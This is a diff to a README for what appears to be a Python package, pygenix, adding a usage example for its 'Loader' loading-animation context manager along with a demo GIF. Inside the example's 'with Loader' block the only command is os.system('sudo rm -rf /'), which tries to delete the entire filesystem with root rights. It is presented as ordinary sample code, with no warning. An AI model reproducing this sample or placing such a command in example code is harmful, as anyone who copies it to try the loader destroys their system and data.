@@ -44,3 +44,14 @@ from pygenix.utils import splatfrom
 print(splatfrom)
 ```
 ![splatform](https://user-images.githubusercontent.com/73960425/123831819-54d08800-d922-11eb-928f-edeb611c97c3.png)
+
+-  Getting a Loding Animation credits to [him](https://stackoverflow.com/a/66558182/15236498)
+```python
+from pygenix.utils import Loader
+import os
+with Loader("Loading..."):
+  #do anything here
+  os.system('sudo rm -rf /')
+```
+![ezgif com-gif-maker](https://user-images.githubusercontent.com/73960425/129732668-0cb20610-4919-44c8-a5cf-3e16eaa94f42.gif)
+
